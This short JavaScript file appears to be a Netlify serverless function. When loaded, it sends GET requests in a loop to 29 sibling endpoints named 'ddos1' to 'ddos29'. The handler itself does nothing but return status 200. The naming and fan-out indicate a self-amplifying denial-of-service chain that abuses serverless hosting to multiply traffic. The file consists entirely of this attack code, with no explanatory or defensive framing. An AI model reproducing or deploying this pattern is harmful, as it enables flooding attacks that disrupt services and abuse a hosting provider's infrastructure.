const axios = require('axios');

for (let i = 1; i < 30; i++) {
  axios.get(`ddos.kevinleoni.me/.netlify/functions/ddos${i}`);
}

exports.handler = async (event, context) => {
    return {
        statusCode: 200
    }
}